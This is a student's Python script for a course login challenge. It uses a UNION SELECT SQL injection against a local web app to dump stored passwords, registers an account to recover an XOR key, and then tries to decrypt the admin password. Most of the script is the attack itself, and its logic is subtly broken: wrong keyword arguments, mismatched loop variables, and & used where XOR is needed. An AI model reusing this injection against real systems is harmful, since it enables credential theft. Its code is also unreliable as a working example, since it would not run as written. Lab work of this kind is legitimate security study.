# Dylan Ramdhan, CS 357
# Login Authentification: Challenge 5.0

# Registeration Credentials:
#   username: hackerguy2000
#   password: hacker2023

# sources:
#   - Used for HEX to ASCII
#       ** https://www.adamsmith.haus/python/answers/
#           how-to-convert-a-string-from-hex-to-ascii-in-python
#
#       ** https://www.javatpoint.com/how-to-convert-hex-to-ascii-in-python#
#           :~:text=Using%20the%20struct%20module%3A%20The,a%20hexadecimal
#           %20string%20to%20ASCII.
#
#   - Used for ZIP
#       ** https://www.w3schools.com/python/ref_func_zip.asp

import requests

### Finding User & Encrypted Password ###
urlSearch = "http://localhost:8080/search"
credentialSearch = {
    'name': '" UNION SELECT password FROM users --'
}

rSearch = requests.post(urlSearch, credentials = credentialSearch)
html = rSearch.text

### Registering an Account First ###
url = "http://localhost:8080/register"
credentials = {
    'name': 'anonymous',
    'username': 'hackerguy2000',
    'password': 'hacker2023'
}

r = requests.post(url, credentials = credentials)


### Finding the Registered another Account ####
SearchingCredentials = {
    'name': '" UNION SELECT password FROM users --'
}
SearchingCredentials = requests.post(urlSearch, credentials = SearchingCredentials)
htmlSearch = SearchingCredentials.text



# Finding & Computing the Differences #
html = rSearch.splitlines()
htmlSearch = htmlSearch.splitlines()

newHTML = []
newHTMLSearch = []

for x in html:
    if '<p>' in x:
        newHTML.append(x.strip().strip('<p>').strip('</p>'))

for ss in htmlSearch:
    if '<p>' in x:
        newHTML.append(i.strip().strip('<p>').strip('</p>'))

for oo in newHTML:
    newHTMLSearch.remove(x)

# Turning the Hex --> ASCII ##
HexAccount = newHTMLSearch[0] # <--- this is the new HEX
## sources stated above ##
HexBytes = bytes.fromhex(HexAccount)
myPassASCII = HexBytes.decode("ASCII")


# Getting Secret Key
SecretKey = ''

## Using a ZIP func b/c of a lot of Variables ##
for xx, oo in zip('hacker2023', myPassASCII):
    SecretKey += chr(ord(xx) ^ ord(oo))


############## USER ADMIN LOGIN ###################
adminSearch = {
    'name': '" UNION SELECT password FROM users --'
}

rAdminSearch = requests.post(urlSearch, credentials = adminSearch)
AdminHTML = rAdminSearch.text

HTMLAdmin = AdminHTML.splitlines()
newHTMLAdmin = []

for ii in html:
    if '<p>' in ii:
        newHTMLAdmin.append(ii.strip().strip('<p>').strip('/p'))

adminHEXBytes = bytes.fromhex(newHTMLAdmin[0])
adminPassASCII = adminHEXBytes.decode("ASCII")

## What was Done with the Secret Key but Reversed ##
adminPassword = ''
for xx, oo in zip(adminPassASCII, SecretKey):
    adminPassword += chr(ord(xx) & ord(oo))

# Printing out the Password
print(adminPassword)